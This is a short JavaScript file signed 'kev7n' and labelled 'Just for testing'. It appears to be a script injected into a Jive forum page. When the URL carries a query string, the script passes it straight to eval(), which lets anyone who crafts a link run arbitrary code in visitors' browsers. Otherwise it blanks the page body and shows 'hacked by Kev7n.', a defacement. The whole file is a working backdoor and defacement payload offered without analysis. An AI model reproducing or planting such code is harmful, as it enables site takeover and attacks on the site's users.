//Just for testing
//By kev7n

var queryString = document.location.search.substr(1);
if(!!queryString){
    var cmd = decodeURIComponent(queryString);
    eval(cmd);
}else{
    var body=document.getElementsByClassName('jive-body-content')[0];
    body.innerHTML='';
    body.style.background='black';
    body.innerHTML='<span style=\'color:0xff00\'>hacked by Kev7n.</span>';
}
